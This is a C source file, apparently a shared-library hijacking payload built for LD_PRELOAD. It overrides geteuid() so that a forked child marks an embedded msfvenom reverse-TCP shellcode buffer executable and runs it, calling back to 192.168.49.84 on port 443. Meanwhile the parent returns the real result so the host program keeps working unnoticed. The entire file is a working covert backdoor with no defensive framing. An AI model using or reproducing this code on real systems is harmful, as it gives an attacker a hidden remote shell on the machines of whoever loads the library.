#define _GNU_SOURCE
#include <sys/mman.h> // for mprotect
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <unistd.h>

// Result of msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.84 LPORT=443 -f c
char buf[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x01\xbb\xc0\xa8\x31\x54\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

// Define function with method signature matching the original
uid_t geteuid(void)
{
    // Define pointer to memory location where original function is stored
    typeof(geteuid) *old_geteuid;

    // Get memory address of original function
    old_geteuid = dlsym(RTLD_NEXT, "geteuid");

    // Fork child process from parent to run shellcode
    if (fork() == 0)
    {
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        // Set memory access properties to readable and executable and run shellcode
        if (mprotect((void *)(((intptr_t)buf)& ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC))
        {
            perror("mprotect");
            return -1;
        }
        int (*ret)() = (int(*)())buf;
        ret();
    }
    // Continue execution of function inside original program
    else 
    {
        return (*old_geteuid)();
    }
    return -2;
}
